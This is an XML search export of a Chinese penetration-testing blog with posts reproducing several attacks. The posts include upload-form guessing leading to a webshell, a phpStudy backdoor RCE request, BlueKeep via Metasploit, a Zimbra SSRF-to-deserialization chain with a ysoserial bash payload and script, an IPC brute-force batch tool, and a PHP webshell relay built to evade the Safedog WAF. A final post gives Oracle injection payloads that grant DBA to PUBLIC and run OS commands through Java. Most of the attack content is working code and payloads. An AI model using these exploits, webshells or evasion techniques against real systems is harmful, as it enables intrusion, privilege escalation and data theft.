<?xml version="1.0" encoding="utf-8"?>
<search>
  <entry>
    <title><![CDATA[上传 - 猜测表单参数getshell]]></title>
    <url>%2F2019%2F10%2F18%2F%E4%B8%8A%E4%BC%A0-%E7%8C%9C%E6%B5%8B%E8%A1%A8%E5%8D%95%E5%8F%82%E6%95%B0getshell%2F</url>
    <content type="text"><![CDATA[0x01 前言大佬给了个上传点，说是这个点足够写一篇教程了，遂尝试一下，看自己得行不。上传点如下： https://subdomain.target.com/UpLoad/UpLoad.aspx 访问之，302跳转到User_Status 阅读本篇文章能了解到：上传, getshell 0x02 猜测参数没有任何功能点，显然是需要猜参数了，与其说是猜测不如说是构造，使用通用表单上传参数 123456789Content-Type: multipart/form-data; boundary=--------1036030574----------1036030574Content-Disposition: form-data; name="Filedata"; filename="pic.jpg"Content-Type: text/plain123----------1036030574-- 显然response并无变化，也没有上传成功的提示，更换几个常用的name，filename后一样无果无头苍蝇般的猜测显然不行，查看源码找找有用信息并无有价值信息，进一步查看js，jquery忽略不看，直接看第二个comfun.js 随便翻翻，果然发现点有用的东西，函数UpLoadPic 直接访问/UpLoad/UpLoadPic.aspx，一样302跳转到User_Status 尝试把函数中的参数全部构造成表单提交 123456789101112131415161718192021222324252627282930313233343536373839404142----------1036030574Content-Disposition: form-data; name="ObjNM"; Content-Type: text/plain1----------1036030574Content-Disposition: form-data; name="FilePath"; Content-Type: text/plainpic.jpg----------1036030574Content-Disposition: form-data; name="UpLoadBtnNM"; Content-Type: text/plain1----------1036030574Content-Disposition: form-data; name="DeleteBtnNM"; Content-Type: text/plain1----------1036030574Content-Disposition: form-data; name="MaxFileSize"; Content-Type: text/plain1----------1036030574Content-Disposition: form-data; name="MaxSize"; Content-Type: text/plain1----------1036030574Content-Disposition: form-data; name="IsCover"; Content-Type: text/plain1----------1036030574-- 上传页面出现了 果断上传asp，提示白名单 iis8.0 并无解析漏洞，随便试试，爆出绝对路径D:\web_root\UpLoad，不知是否有用，先留着 继续fuzz，发现无法绕过，就连白名单的jpg都无法上传，经过多次fuzz，txt可上传，并返回文件名 根据上述绝对路径，直接加在/upload/，得到相对路径 0x03 getshell经测试，该上传点白名单无法绕过，遂放弃，另辟蹊径继续回头看js，函数UpLoadPic下还有函数UpLoadFile 同理构造表单上传，看到档案格式不限，感觉希望来了 直接梭哈asp 哦豁，getshell！ 0x04 总结该篇重点在于构造表单参数，在扫到一些上传页面无按钮时不要放弃，猜测参数有时能一击必杀另外header中boundary=--------1036030574不可缺少，表单分割线要保持一致至于后面的就是找对功能点，任意上传了。]]></content>
      <tags>
        <tag>上传</tag>
        <tag>getshell</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[Phpstudy - RCE 复现]]></title>
    <url>%2F2019%2F10%2F12%2FPhpstudy-RCE-%E5%A4%8D%E7%8E%B0%2F</url>
    <content type="text"><![CDATA[check9月26号就写好了，一下子就到这个时候了，严重拖延症 先用公开的脚本check一下自己机器上常用的，phpstudy后门文件分析以及检测脚本 呵呵，中招，一直在使用phpstudy2016版，上图是2018测试的（我的2016一样中招，被我修复了，没截图），也就是说做肉鸡三年了(微笑)，不过好在我只在用的时候开启apache。 阅读本篇文章能了解到：phpstudy, RCE 首发的文章说，官网下的并不会出问题，我使用的一直是官网的，上图也是2018版官网下的，一样中招，也就是phpstudy早在2016年甚至更早就被黑了。 复现12345GET / HTTP/1.1Host: 192.168.2.51User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:55.0) Gecko/20100101 Firefox/55.0Accept-Encoding: gzip,deflateAccept-charset: ZWNobyBzeXN0ZW0oIm5ldCB1c2VyIik7 呵呵，真好用！真香！ 只需要更改ZWNobyBzeXN0ZW0oIm5ldCB1c2VyIik7，base64编码的命令而已 坑点Accept-Encoding: gzip,deflate注意：gzip,deflate 必须是此格式，中间只能有逗号，不能有空格 搞得我又测了好久，因为fiddler抓包是这样的格式gzip, deflate，这样会导致rce失败 参考链接https://www.t00ls.net/viewthread.php?tid=52922https://www.t00ls.net/viewthread.php?tid=52966]]></content>
      <tags>
        <tag>复现</tag>
        <tag>RCE</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[0708 - CVE-2019-0708 复现]]></title>
    <url>%2F2019%2F10%2F12%2F0708-CVE-2019-0708-%E5%A4%8D%E7%8E%B0%2F</url>
    <content type="text"><![CDATA[0x01 准备环境2019年9月7日晚上凌晨1点，github上发布了0708的漏洞利用程序，看了别人的复现和讨论，感觉不太好用，懒得复现，这两天闲了，复现出来发发博客，好久没发了，主要是没啥新东西可以发，不方便发 下载攻击套件1234wget https://raw.githubusercontent.com/rapid7/metasploit-framework/edb7e20221e2088497d1f61132db3a56f81b8ce9/lib/msf/core/exploit/rdp.rbwget https://github.com/rapid7/metasploit-framework/raw/edb7e20221e2088497d1f61132db3a56f81b8ce9/modules/auxiliary/scanner/rdp/rdp_scanner.rbwget https://github.com/rapid7/metasploit-framework/raw/edb7e20221e2088497d1f61132db3a56f81b8ce9/modules/exploits/windows/rdp/cve_2019_0708_bluekeep_rce.rbwget https://github.com/rapid7/metasploit-framework/raw/edb7e20221e2088497d1f61132db3a56f81b8ce9/modules/auxiliary/scanner/rdp/cve_2019_0708_bluekeep.rb 拷贝到metasploit对应目录下，我这里是kali自带的目录 阅读本篇文章能了解到：0708, msf 1234cp rdp.rb /usr/share/metasploit-framework/lib/msf/core/exploit/cp rdp_scanner.rb /usr/share/metasploit-framework/modules/auxiliary/scanner/cp cve_2019_0708_bluekeep_rce.rb /usr/share/metasploit-framework/modules/exploits/rdp/cp cve_2019_0708_bluekeep.rb /usr/share/metasploit-framework/modules/auxiliary/scanner/rdp 更新msf我是使用kali2.0 1902版本的msf，先更新，记得使用proxychains，不然怎么都更新失败哦 123gedit /etc/proxychains.confproxychains /bin/bashapt update; apt install metasploit-framework 0x02 配置启动msf，重载0708利用模块 12msfconsolereload_all 重载完成search一下，找到刚才添加的，并开始利用 123search 0708use exploit/rdp/cve_2019_0708_bluekeep_rceshow options 看到选项，只有俩需要设置，RHOSTS、target RHOSTS: 目标地址 target: 可选为0-4，设置受害机机器架构 0x03 exploit目标机器为win7 专业版，尝试5个target 从options中的target可以清楚看到0-4各个对应什么，很有针对性，反正是各种虚拟机，呵呵结果可想而知，基本上都是蓝屏 根据瞎子老哥的复现，我决定更换旗舰版试试，试了一遍还是蓝屏，看到他说配置设置成2核2g，我改成如下图配置 0-4再次尝试一遍，在target=3时，成功弹回 0x04 总结食之无味，弃之可惜，纯属鸡肋，看到target针对那么多都是虚拟机就知道 从0708消息出来到exp经过3个月左右时间吧，却只拿到这么个鸡肋exp，令人唏嘘，看看后期是否有好用的吧 另外，2008听说还要修改注册表才能成功？黑人问号？？？债见，浪费绳命的东西就不折腾了 0x05 参考链接https://www.t00ls.net/viewthread.php?tid=52701&amp;highlight=0708]]></content>
      <tags>
        <tag>CVE</tag>
        <tag>复现</tag>
        <tag>msf</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[Zimbra - SSRF+Memcached+反序列化复现]]></title>
    <url>%2F2019%2F04%2F30%2FZimbra-SSRF-Memcached-%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%A4%8D%E7%8E%B0%2F</url>
    <content type="text"><![CDATA[环境搭建我就不搭建了，其实我按照作者给的搭建过程也没搭建成功，我直接使用一个现成环境测试。 利用条件需要获取到3个变量 zmImap:[accountId]:[folderNo]:[modseq]:[uidvalidity] 阅读本篇文章能了解到：Zimbra, 反序列化 accountId：用户的ID，通过登陆zimbra获取folderNo：2，代表inboxmodseq和uidvalidity通过登陆imap获取 步骤1. 设置zimbraMemcachedClientServerList Imap的zimbraMemcachedClientServerList默认为空，无法使用ImapSession的反序列化，所以需要自己命令行设置 web环境当然没办法执行命令，根据作者的思考，ModifyServer可实现通过web修改。 ModifyConfigRequest1&lt;soap:Envelope xmlns:soap="http://www.w3.org/2003/05/soap-envelope"&gt;&lt;soap:Header&gt;&lt;context xmlns="urn:zimbra"&gt;&lt;userAgent xmlns="" name="ZimbraWebClient - FF52 (Win)"/&gt;&lt;session xmlns="" id="3129324"/&gt;&lt;format xmlns="" type="js"/&gt;&lt;csrfToken xmlns=""&gt;0_62c250d442e69ba3a624ac1bea96dac8648b86f6&lt;/csrfToken&gt;&lt;/context&gt;&lt;/soap:Header&gt;&lt;soap:Body&gt;&lt;BatchRequest xmlns="urn:zimbra" onerror="stop"&gt;&lt;ModifyConfigRequest xmlns="urn:zimbraAdmin"&gt;&lt;a xmlns="" n="zimbraMemcachedClientServerList"&gt;127.0.0.1&lt;/a&gt;&lt;/ModifyConfigRequest&gt;&lt;/BatchRequest&gt;&lt;/soap:Body&gt;&lt;/soap:Envelope&gt; 可通过命令查看是否设置成功 1/opt/zimbra/bin/zmprov gs `/opt/zimbra/bin/zmhostname` zimbraMemcachedClientServerList 2. reload根据作者说法，reload后即可完成Memcached重载 ReloadMemcachedClientConfigRequest1&lt;soap:Envelope xmlns:soap="http://www.w3.org/2003/05/soap-envelope"&gt;&lt;soap:Header&gt;&lt;context xmlns="urn:zimbra"&gt;&lt;userAgent xmlns="" name="ZimbraWebClient - FF52 (Win)"/&gt;&lt;session xmlns="" id="3129324"/&gt;&lt;format xmlns="" type="js"/&gt;&lt;csrfToken xmlns=""&gt;0_62c250d442e69ba3a624ac1bea96dac8648b86f6&lt;/csrfToken&gt;&lt;/context&gt;&lt;/soap:Header&gt;&lt;soap:Body&gt;&lt;BatchRequest xmlns="urn:zimbra" onerror="stop"&gt;&lt;ReloadMemcachedClientConfigRequest xmlns="urn:zimbraAdmin"&gt;&lt;/ReloadMemcachedClientConfigRequest&gt;&lt;/BatchRequest&gt;&lt;/soap:Body&gt;&lt;/soap:Envelope&gt; web请求响应reloadResponse正常，证明reload成功 但我实测发现并不行，需要zmcontrol restart，坑了很久，也就是说无法reload让zimbra重新加载memcached，到这一步就感觉鸡肋了，但也可能是我姿势有误。 3. 获取id如果能xxe打到localconfig.xml，即拿到ldap_password，此时可通过管理账号创建一个新用户，无需登录即可得到id，如图所示 若未能xxe，则只能通过其他手段（暴破等）获取一个用户账密 4. 获取modseq和uidvalidity使用刚创建的用户登录imap，并select inbox获取；imap端口为143、993，143个别机器允许明文登录，大多数不可明文登录且有很多奇怪错误，故使用993加密登录 1234ncat --ssl [ip] 993axyz login test test123456a select inboxaxyz logout 5. 生成payload下载ysoserial源码，此处作者没说清，需要修改pom.xml，将1.7R2改为1.6R7，然后重新打包，打包过程让同事帮忙完成。 echo justatest &gt; /tmp/justatest.txt payload从这http://jackson-t.ca/runtime-exec-payloads.html生成 1java -jar ysoserial-0.0.6-SNAPSHOT-all.jar MozillaRhino2 &quot;bash -c &#123;echo,ZWNobyBqdXN0YXRlc3QgPiAvdG1wL2p1c3RhdGVzdC50eHQ=&#125;|&#123;base64,-d&#125;|&#123;bash,-i&#125;&quot; &gt; wakaka.obj 6. SSRF to Memcached使用作者给的请求脚本，修改上述获取的到3个值，和adminToken及域名，利用ssrf向11211发起请求 1234567891011121314import requests accountid = "[2ebf42fc-d971-438c-8734-912f4ed90fa9]" folderNo= 2 modseq = [1]uidvalidity = [1]cacheKey ="zmImap:&#123;accountId&#125;:&#123;folderNo&#125;:&#123;modseq&#125;:&#123;uidvalidity&#125;".format(accountId=accountid,folderNo=str(folderNo),modseq=str(modseq),uidvalidity=str(uidvalidity)) print(cacheKey) with open(r"wakaka.obj","rb") as f: payload = f.read() set_command = b"set &#123;cacheKey&#125; 2048 3600 &#123;payloadsize&#125;\r\n".format(cacheKey=cacheKey,payloadsize=str(len(payload)))+payload+"\r\n" headers = &#123;"Cookie":"ZM_ADMIN_AUTH_TOKEN=[0_a371057a5246a4e62484dee80cc0733a6b2d10d2_69643d33363a65306661666438392d313336302d313164392d383636312d3030306139356439386566323b6578703d31333a313535363633363536323334373b61646d696e3d313a313b747970653d363a7a696d6272613b753d313a613b7469643d393a3136353638373835343b];", "host":"[domain.com]:7071"&#125; r = requests.post("https://[domain.com]/service/proxy?target=http://127.0.0.1:11211",data=set_command,headers=headers,verify=False) 7. 触发反序列化再次imap登陆同一账号并select inbox 查看/tmp目录 总结 目标需开放7071 能重启zimbra服务器，或reload成功完成加载 这么一看，妈耶，好鸡肋但有朋友告诉我，条件允许的话，7071不开放也可行，若7071开放，还能通杀？包括8.8.x，也许他们研究出了ssrf带cookie的操作？好吧，研究不透，有研究的朋友可以交流一下。 另外说下原作者fnmsd，人超好，问问题回答的很详细，很有耐心，这篇整体的复现遇到很多坑，师傅也帮我各种解答，十分感谢！阿里嘎多！ 参考链接https://blog.csdn.net/fnmsd/article/details/89235589]]></content>
      <tags>
        <tag>Zimbra</tag>
        <tag>反序列化</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[IPC暴破 - Bat]]></title>
    <url>%2F2018%2F12%2F20%2FIPC%E6%9A%B4%E7%A0%B4-Bat%2F</url>
    <content type="text"><![CDATA[0x01 前言在内网环境中，掌握一些密码后，最基础，最有效获取服务器权限的方式即ipc暴破 关于ipc暴破，这类工具在网上见的不多。目前工作中见到的有直接开无数个cmd的伪bat，还有身边同事powershell写的ps1，powershell是挺好用的，但有个关键问题是目标机器必须是win7及以上，遇到老机器当然是没法用了。 因此，bat无疑是首选，因其语言较底层，不够高级，写起来比较吃力 花了几天时间改了几个版本，解决了密码特殊字符，菜刀判断进程等各种问题，更新日志在update.txt，应用在自己的实战中。 阅读本篇文章能了解到：IPC, Bat 0x02 Bat需要提供以下两个文件 username.txt, password.txt password.txt：不必多说，放入密码即可，一行一个 username.txt：放入对应的域\用户，大概是win2012以上域时，在ipc连接时必须加入域，为了兼容高版本，所以直接以域\用户形式存入文件 举个例子： username.txt12localhost\administratorred.ad\redn3ck 本来想直接在bat中用数组写入username，因为批处理中不自带数组功能，先是实现了数组，结果因为变量延迟导致密码为特殊字符时，如!,^等，导致这些字符无法带入命令，会被批处理吞没，花了好久时间也没搞定如何解决此问题，有解决方法的老哥还望指导 截图 温馨提示：程序启动会在当前目录生成ip.txt，即-h参数指定的ip段，程序结束时会自动删除并生成out.txt。 0x03 Codeipc.bat123456789101112131415161718192021@echo off:startif "%1"=="" goto usageif "%1"=="-h" goto ip-range:usageecho.echo Usage:echo [-h ips] host(ip) range, 192.168.0.1-255echo tips: password.txt is needed.echo username.txt is needed.echo ipc.bat can not add path like 'c:\programdata\ipc.bat'.echo.echo example:echo ipc.bat -h 192.168.0.1-255goto :eof...... 0x04 参考链接https://www.t00ls.net/thread-30632-1-1.html]]></content>
      <tags>
        <tag>IPC</tag>
        <tag>bat</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[Struts2 - S2-057复现 (CVE-2018-11776)]]></title>
    <url>%2F2018%2F08%2F29%2FStruts2-S2-057%E5%A4%8D%E7%8E%B0-CVE-2018-11776%2F</url>
    <content type="text"><![CDATA[前言Struts2又出漏洞了，上一波的045好用到不行，复现参考https://github.com/jas502n/St2-057 写这篇文章时，vulhub还没有057的漏洞环境 当Struts2的配置满足以下条件时： alwaysSelectFullNamespace值为true action元素未设置namespace属性，或使用了通配符 namespace将由用户从uri传入，并作为OGNL表达式计算，最终造成任意命令执行漏洞。 影响版本: 小于等于 Struts 2.3.34 与 Struts 2.5.16 看这个条件就知道没那么好利用 阅读本篇文章能了解到：vulhub, docker 0x01 vulhub安装踩坑： https://github.com/vulhub/vulhub/ CentOS 7 安装各种不成功，别小看Installation简简单单4条命令，折腾了一天时间，从CentOS 到ubuntu16.04 总结一下坑点（非root下安装） 安装pip1curl -s https://bootstrap.pypa.io/get-pip.py | python3 直接使用安装命令一直 提示 –user错误，尝试sudo、python3 后加--user、还是不行，各种尝试，不行 解决方案： 12wget https://bootstrap.pypa.io/get-pip.pypython3 get-pip.py --user 安装最新版docker1curl -s https://get.docker.com/ | sh 简单一条命令安装，怎么都不行，就是安装不上，还无报错提示，-s 安静模式去掉，看到访问超时，估计又被q了 安装proxychains+shadowsocksUbuntu 16.04 LTS shadowsocks+proxychains 安装及设置 解决方案： 123456proxychains wget https://get.docker.commv index.html getdocker.shsudo proxychains ./getdocker.shtoor@toor-virtual-machine:~$ docker -vDocker version 18.06.1-ce, build e68fc7a 行了，两条命令终于搞定了，以为万事大吉，其实踩坑才刚刚开始 启动docker服务1sudo service docker start 你懂得，不会那么顺利，继续报错，网上各种解决方法 Couldn’t connect to Docker daemon at http+unix:// 都试了一遍还是没法启动 怎么办，有点抓狂了，折腾一下午了 仔细看README.md中Notice 为防止出现权限错误，最好使用root用户执行docker和docker-compose命令 尝试sudo 再来一遍，一样无法启动 重头开始， sudo su进入root，以root权限重新来过纳尼？启动正常了，行吧，花一天时间只为踩坑 安装compose1pip install docker-compose 安装git1apt install git 拉取项目1git clone https://github.com/vulhub/vulhub.git 0x02 复现启动环境struts不用编译，直接启动 12cd vulhub/struts2/s2-048docker-compose up -d 搭建s2-057漏洞环境12345# 查看容器iddocker ps -a# 在容器cf341620ead4中开启一个交互模式的终端docker exec -i -t cf341620ead4 /bin/bash 笔记1234docker exec :在运行的容器中执行命令 -d :分离模式: 在后台运行 -i :即使没有附加也保持STDIN 打开 -t :分配一个伪终端 Struts 2.5.16存在s2-057漏洞，下载Struts 2.5.16 12345mkdir /usr/local/tomcat/webapps/testcd /usr/local/tomcat/webapps/testwget https://fossies.org/linux/www/legacy/struts-2.5.16-all.zipapt-get install unzip -ycp struts-2.5.16/apps/struts2-showcase.war /usr/local/tomcat/webapps/ 修改配置文件1locate struts-actionchaining.xml 实际上locate命令在此docker容器中不存在，改用find查找 12345toor@toor-virtual-machine:~$ find / -name struts-actionchaining.xml/usr/local/tomcat/webapps/struts2-showcase/WEB-INF/classes/struts-actionchaining.xml/usr/local/tomcat/webapps/struts2-showcase/WEB-INF/src/java/struts-actionchaining.xml.... 修改这个两个文件 123vim /usr/local/tomcat/webapps/struts2-showcase/WEB-INF/classes/struts-actionchaining.xmlbash: vim: command not foundapt install vim 经查，需要先同步源索引，再安装 12apt-get updateapt install vim &lt;struts&gt;&lt;/struts&gt;整个标签替换为 123456789&lt;struts&gt; &lt;package name="actionchaining" extends="struts-default"&gt; &lt;action name="actionChain1" class="org.apache.struts2.showcase.actionchaining.ActionChain1"&gt; &lt;result type="redirectAction"&gt; &lt;param name = "actionName"&gt;register2&lt;/param&gt; &lt;/result&gt; &lt;/action&gt; &lt;/package&gt;&lt;/struts&gt; 重启服务123456cd /usr/local/tomcat/bin/./shutdown.shexitcd vulhub/struts2/s2-048docker-compose up -d 0x03 验证1http://192.168.1.59:8080/struts2-showcase/$&#123;(444+333)&#125;/actionChain1.action 当前这个版本计算器弹不出，能弹出的版本就不测了，参考链接里有 0x04 参考链接http://www.freebuf.com/articles/system/180142.htmlhttps://mp.weixin.qq.com/s?__biz=MzI2MTAxOTg1OQ==&amp;mid=2650049324&amp;idx=1&amp;sn=e5660c5720f17f0752e39ec0e533632c&amp;chksm=f260ea90c5176386a9346853df298cf926cd00f519bfde42c20d229444f6bd8552ca6b65449e&amp;mpshare=1&amp;scene=23&amp;srcid=0713GGhQHb4IUVNVYjUVZ5Oy#rdhttps://github.com/jas502n/St2-057]]></content>
      <tags>
        <tag>CVE</tag>
        <tag>复现</tag>
        <tag>struts2</tag>
        <tag>docker</tag>
        <tag>vulhub</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[安全狗绕过 - 本地中转bypass]]></title>
    <url>%2F2018%2F07%2F22%2F%E5%AE%89%E5%85%A8%E7%8B%97%E7%BB%95%E8%BF%87-%E6%9C%AC%E5%9C%B0%E4%B8%AD%E8%BD%ACbypass%2F</url>
    <content type="text"><![CDATA[前言若服务器安装了安全狗，普通一句话安全狗肯定拦截，菜刀必然无法使用。 究其原因：菜刀请求关键字等被安全狗识别导致中断请求。 构造本地中转脚本，本地服务器发送请求，对菜刀请求关键字进行编码，服务端再对请求解码，这样安全狗无法识别也就无法拦截请求。 客户端客户端即中转脚本transfer.php 客户端对菜刀请求参数进行编码操作，此处仅做简单编码验证bypass，编码顺序依次为 base64_encode(),str_rot13(),strrev(),base64_encode() 经过这4层编码，对服务端发送请求。 客户端：transfer.php1234567891011121314151617181920212223242526272829303132333435&lt;?php function encode($str)&#123; $DS = base64_encode($str); $DS = str_rot13($DS); $DS = strrev($DS); $DS = base64_encode($DS); return $DS; &#125; // webshell地址，transServ.php为定制一句话 $webshell = 'http://127.0.0.1/transServ.php'; $pdata = $_POST; foreach($pdata as $key=&gt;$value)&#123; if(is_array($value))&#123; $value=implode($value); &#125; // 菜刀密码 if($key == 'pass') &#123; $pdata[$key] = encode($value); &#125; &#125; // var_dump($pdata); $data = http_build_query($pdata); $opts = array ( 'http' =&gt; array ( 'method' =&gt; 'POST', 'header'=&gt; "Content-type: application/x-www-form-urlencoded\r\n" . "Content-Length: " . strlen($data) . "\r\n", 'content' =&gt; $data) ); $context = stream_context_create($opts); // 创建资源流上下文,数据包 $html = @file_get_contents($webshell, false, $context); echo $html;?&gt; 服务端服务端只需对请求进行解码操作，然后正常使用菜刀一句话即可，解码顺序依次为 base64_decode(),str_rot13(),strrev(),base64_decode() 此处使用array_map()回调后门，为保证新旧菜刀均可使用 版本需求：php&gt;5.2 服务端：transServ.php1234567891011121314151617&lt;?php $DS = @$/*-*/&#123;"_P"."OST"&#125;['pass'];if (!empty($DS) )&#123; echo $DS."&lt;br&gt;"; $DS = @base64_decode($DS); echo $DS."&lt;br&gt;"; $DS = @strrev($DS); echo $DS."&lt;br&gt;"; $DS = @str_rot13($DS); echo $DS."&lt;br&gt;"; $DS = @base64_decode($DS); echo $DS."&lt;br&gt;"; @array_map(assert,(array)$DS); exit;&#125;?&gt; 连接浏览器验证 菜刀连接连接本地中转脚本，中转脚本对webshell发送编码后请求。 bypass安全狗]]></content>
      <tags>
        <tag>安全狗</tag>
        <tag>绕过</tag>
        <tag>bypass</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[Oracle注入 - 命令执行&Shell反弹]]></title>
    <url>%2F2018%2F04%2F25%2FOracle%E6%B3%A8%E5%85%A5-%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C-Shell%E5%8F%8D%E5%BC%B9%2F</url>
    <content type="text"><![CDATA[0x01 Oracle安装CentOS 7 安装oracle10g，装了一天，特此记录 oracle9i,10G,11G,各版本下载资源 Centos6/7下静默安装oracle10g 0x02 命令执行本文测试环境均为： CentOS Linux release 7.2.1511 (Core) Oracle Database 10g Enterprise Edition Release 10.2.0.1.0 - 64bit Production 执行方式很多种，这边只研究Oracle10g，并且本地实测成功的 DBMS_EXPORT_EXTENSION() dbms_xmlquery.newcontext() DBMS_JAVA_TEST.FUNCALL() 注意：注入时需去除末尾分号; 方法1. DBMS_EXPORT_EXTENSION() 影响版本：Oracle 8.1.7.4, 9.2.0.1-9.2.0.7, 10.1.0.2-10.1.0.4, 10.2.0.1-10.2.0.2, XE(Fixed in CPU July 2006) 权限：None 详情：这个软件包有许多易受PL/SQL注入攻击的函数。这些函数由SYS拥有，作为SYS执行并且可由PUBLIC执行。因此，如果SQL注入处于上述任何未修补的Oracle数据库版本中，那么攻击者可以调用该函数并直接执行SYS查询。 提权：该请求将导致查询”GRANT DBA TO PUBLIC”以SYS身份执行。 因为这个函数允许PL / SQL缺陷（PL / SQL注入）。一旦这个请求成功执行，PUBLIC获取DBA角色，从而提升当前user的特权1select SYS.DBMS_EXPORT_EXTENSION.GET_DOMAIN_INDEX_TABLES('FOO','BAR','DBMS_OUTPUT".PUT(:P1);EXECUTE IMMEDIATE ''DECLARE PRAGMA AUTONOMOUS_TRANSACTION;BEGIN EXECUTE IMMEDIATE ''''grant dba to public'''';END;'';END;--','SYS',0,'1',0) from dual 使用java（1) 创建Java库1select SYS.DBMS_EXPORT_EXTENSION.GET_DOMAIN_INDEX_TABLES('FOO','BAR','DBMS_OUTPUT".PUT(:P1);EXECUTE IMMEDIATE ''DECLARE PRAGMA AUTONOMOUS_TRANSACTION;BEGIN EXECUTE IMMEDIATE ''''create or replace and compile java source named "LinxUtil" as import java.io.*; public class LinxUtil extends Object &#123;public static String runCMD(String args)&#123;try&#123;BufferedReader myReader= new BufferedReader(new InputStreamReader(Runtime.getRuntime().exec(args).getInputStream() ) ); String stemp,str="";while ((stemp = myReader.readLine()) != null) str +=stemp+"\n";myReader.close();return str;&#125; catch (Exception e)&#123;return e.toString();&#125;&#125;public static String readFile(String filename)&#123;try&#123;BufferedReader myReader= new BufferedReader(new FileReader(filename)); String stemp,str="";while ((stemp = myReader.readLine()) != null) str +=stemp+"\n";myReader.close();return str;&#125; catch (Exception e)&#123;return e.toString();&#125;&#125;&#125;'''';END;'';END;--','SYS',0,'1',0) from dual (2) 赋予Java权限1select SYS.DBMS_EXPORT_EXTENSION.GET_DOMAIN_INDEX_TABLES('FOO','BAR','DBMS_OUTPUT".PUT(:P1);EXECUTE IMMEDIATE ''DECLARE PRAGMA AUTONOMOUS_TRANSACTION;BEGIN EXECUTE IMMEDIATE ''''begin dbms_java.grant_permission(''''''''PUBLIC'''''''', ''''''''SYS:java.io.FilePermission'''''''',''''''''&lt;&gt;'''''''', ''''''''execute'''''''');end;'''';END;'';END;--','SYS',0,'1',0) from dual (3) 创建函数1select SYS.DBMS_EXPORT_EXTENSION.GET_DOMAIN_INDEX_TABLES('FOO','BAR','DBMS_OUTPUT".PUT(:P1);EXECUTE IMMEDIATE ''DECLARE PRAGMA AUTONOMOUS_TRANSACTION;BEGIN EXECUTE IMMEDIATE ''''create or replace function LinxRunCMD(p_cmd in varchar2) return varchar2 as language java name''''''''LinxUtil.runCMD(java.lang.String) return String'''''''';'''';END;'';END;--','SYS',0,'1',0) from dual (4) 赋予函数执行权限1select SYS.DBMS_EXPORT_EXTENSION.GET_DOMAIN_INDEX_TABLES('FOO','BAR','DBMS_OUTPUT".PUT(:P1);EXECUTE IMMEDIATE ''DECLARE PRAGMA AUTONOMOUS_TRANSACTION;BEGIN EXECUTE IMMEDIATE ''''grant all on LinxRunCMD to public'''';END;'';END;--','SYS',0,'1',0) from dual (5) 执行1select sys.LinxRunCMD('/bin/bash -c /usr/bin/whoami') from dual 方法2. dbms_xmlquery.newcontext()此方法成功前提 影响版本：Oracle 8.1.7.4, 9.2.0.1-9.2.0.7, 10.1.0.2-10.1.0.4, 10.2.0.1-10.2.0.2, XE(Fixed in CPU July 2006) 即方法1 中DBMS_EXPORT_EXTENSION存在漏洞情况下，否则赋予权限时无法成功 (1) 创建java包1select dbms_xmlquery.newcontext('declare PRAGMA AUTONOMOUS_TRANSACTION;begin execute immediate ''create or replace and compile java source named "LinxUtil" as import java.io.*; public class LinxUtil extends Object &#123;public static String runCMD(String args) &#123;try&#123;BufferedReader myReader= new BufferedReader(new InputStreamReader( Runtime.getRuntime().exec(args).getInputStream() ) ); String stemp,str="";while ((stemp = myReader.readLine()) != null) str +=stemp+"\n";myReader.close();return str;&#125; catch (Exception e)&#123;return e.toString();&#125;&#125;&#125;'';commit;end;') from dual; 通过以下命令可以查看all_objects内部改变：1select * from all_objects where object_name like '%LINX%' or object_name like '%Linx%' (2) 赋予当前用户java权限1234--当前用户查看select user from dualselect SYS.DBMS_EXPORT_EXTENSION.GET_DOMAIN_INDEX_TABLES('FOO','BAR','DBMS_OUTPUT".PUT(:P1);EXECUTE IMMEDIATE ''DECLARE PRAGMA AUTONOMOUS_TRANSACTION;BEGIN EXECUTE IMMEDIATE ''''begin dbms_java.grant_permission(''''''''YY'''''''', ''''''''SYS:java.io.FilePermission'''''''',''''''''&lt;&lt;ALL FILES&gt;&gt;'''''''', ''''''''execute'''''''');end;'''';END;'';END;--','SYS',0,'1',0) from dual; 查看可用的java权限列表，通过以下命令查看赋权情况 1select * from user_java_policy where grantee_name='YY'; 若赋权失败，最后执行命令时会报如下错误 此处很坑，前后折腾，不知道哪里问题，有时可以执行命令，有时不能，网上找了太多赋权命令，不知是哪一条成功，导致我恢复快照不下10次测试问题到底出在哪。 最后找到上述查看赋权情况命令，才找出哪条赋权命令能成功。所以，坑在哪里？ T00ls1select dbms_xmlquery.newcontext('declare PRAGMA AUTONOMOUS_TRANSACTION;begin execute immediate ''begin dbms_java.grant_permission( ''''SYSTEM'''', ''''SYS:java.io.FilePermission'''', ''''&lt;&lt;ALL FILES&gt;&gt;'''',''''EXECUTE'''');end;''commit;end;') from dual; 显而易见，根本没赋权成功关于上述赋权失败，评论里作者回复使用下述命令123select dbms_xmlquery.newcontext('declare PRAGMA AUTONOMOUS_TRANSACTION;begin execute immediate ''grant javauserpriv to YY''commit;end;') from dual;select dbms_xmlquery.newcontext('declare PRAGMA AUTONOMOUS_TRANSACTION;begin execute immediate ''grant javasyspriv to YY''commit;end;') from dual; 显然，一样的结果 随风’s blog1select SYS.DBMS_EXPORT_EXTENSION.GET_DOMAIN_INDEX_TABLES('FOO','BAR','DBMS_OUTPUT".PUT(:P1);EXECUTE IMMEDIATE ''DECLARE PRAGMA AUTONOMOUS_TRANSACTION;BEGIN EXECUTE IMMEDIATE ''''begin dbms_java.grant_permission(''''''''PUBLIC'''''''', ''''''''SYS:java.io.FilePermission'''''''',''''''''&lt;&lt;ALL FILES&gt;&gt;'''''''',''''''''execute'''''''');end;'''';END;'';END;--','SYS',0,'1',0) from dual; 可见，两种方式均无果 (3) 创建函数1select dbms_xmlquery.newcontext('declare PRAGMA AUTONOMOUS_TRANSACTION;begin execute immediate ''create or replace function LinxRunCMD(p_cmd in varchar2) return varchar2 as language java name ''''LinxUtil.runCMD(java.lang.String) return String''''; '';commit;end;') from dual; 判断是否创建成功1select OBJECT_ID from all_objects where object_name ='LINXRUNCMD' 也可通过查看all_objects内部改变判断1select * from all_objects where object_name like '%LINX%' or object_name like '%Linx%' 